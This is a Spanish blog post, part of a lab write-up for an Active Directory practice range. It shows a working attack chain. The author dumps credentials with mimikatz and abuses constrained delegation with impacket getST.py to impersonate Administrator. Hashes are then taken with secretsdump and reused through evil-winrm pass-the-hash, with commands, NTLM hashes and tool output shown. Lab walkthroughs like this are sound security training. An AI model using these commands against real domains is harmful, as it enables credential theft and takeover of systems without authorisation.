---
layout: single
title: Ninja Hacker Academy Parte 3
excerpt: "En esta tercera parte, ejecutaremos mimikatz en la máquina WEB, donde encontraremos las credenciales del usuario Frank, y descubriremos que tiene ciertos privilegios que permiten impersonar al Administrator de la máquina SHARE. Después utilizaremos la cuenta GMSANFS$ para acceder a la cuenta backup, que posee permisos que nos permitirán añadir al usuario Frank al grupo de Domain Admins."
date: 2025-11-08
classes: wide
header:
  teaser: /assets/images/NHA/logo_NHA.jpeg
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---


<p align="center">
  <img src="/assets/images/NHA/logo_NHA.jpeg" alt="Logo NHA" style="max-width:60%; height:auto;">
</p>


# Introducción
En esta tercera parte, ejecutaremos mimikatz en la máquina WEB, donde encontraremos las credenciales del usuario Frank, y descubriremos que tiene ciertos privilegios que permiten impersonar al Administrator de la máquina SHARE. Después utilizaremos la cuenta GMSANFS$ para acceder a la cuenta backup, que posee permisos que nos permitirán añadir al usuario Frank al grupo de Domain Admins.


En el artículo anterior conseguimos un beacon de Mythic del usuario Administrator de la máquina WEB. Teniendo esta cuenta de usuario, es posible ejecutar mimikatz para ver si podemos obtener nuevas credenciales. Lo hacemos ejecutando el siguiente comando en la interfaz de Mythic:

```
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"
```

![](/assets/images/NHA/mimikatz-web.png)

Y de esta forma obtenemos el hash NTLM de la cuenta del usuario Frank.

![](/assets/images/NHA/frank.png)

A continuación con bloodhound se puede observar que la cuenta del usuario Frank tiene privilegios de Constrained Delegation sobre la máquina SHARE.

![](/assets/images/NHA/frank-bh.png)

Es posible, tal como nos dice bloodhound, utilizar GetST.py de impacket, para impersonar al administrator de la máquina SHARE, pero nos encontramos con un error:

```bash
getST.py -spn 'cifs/share.academy.ninja.lan' -impersonate Administrator -dc-ip 'dc-ac.academy.ninja.lan' "academy.ninja.lan"/"frank" -hashes :d4fad93561dee253398d5891e991a6fb
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user frank or initial TGT not forwardable
```

![](/assets/images/NHA/getst-error.png)


El error nos dice que el SPN no está permitido para la delegación. Con lo cual ejecutamos findDelegation.py para ver exactamente cual es el SPN permitido.

```bash
findDelegation.py academy.ninja.lan/frank -hashes d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb -dc-ip 192.168.56.20
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

AccountName  AccountType  DelegationType                      DelegationRightsTo                SPN Exists
-----------  -----------  ----------------------------------  --------------------------------  ----------
DC-AC$       Computer     Unconstrained                       N/A                               Yes
ximo$        Computer     Resource-Based Constrained          WEB$                              No
frank        Person       Constrained w/ Protocol Transition  eventlog/share                    No
frank        Person       Constrained w/ Protocol Transition  eventlog/share.academy.ninja.lan  Yes
```

![](/assets/images/NHA/finddelegation.png)


Y se puede ver que el SPN correcto es eventlog/share, de manera que podemos ejecutar GetST.py de la siguiente forma:

```bash
getST.py -spn 'eventlog/share' -altservice 'cifs/share' -impersonate Administrator -dc-ip 'academy.ninja.lan' "academy.ninja.lan"/"frank" -hashes d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb
```

![](/assets/images/NHA/eventlog.png)

Exportamos la variable correspondiente para utilizar el ticket de kerberos y hacemos un volcado de los hashes.

```bash
export KRB5CCNAME=Administrator@cifs_share@ACADEMY.NINJA.LAN.ccache
secretsdump.py -k -no-pass share
```

![](/assets/images/NHA/sd-share.png)


Y ya podemos conectarnos con evil-winrm utilizando el hash del administrator, subir el loader y obtener un nuevo beacon de Mythic.

```bash
evil-winrm -i share -u administrator -H 7849822ea2995bac91cc0a20c6af1fbe
```

![](/assets/images/NHA/evil-share.png)


![](/assets/images/NHA/mythic-share.png)

Y podemos leer la flag de la máquina en el escritorio del administrador.

![](/assets/images/NHA/flag-share.png)

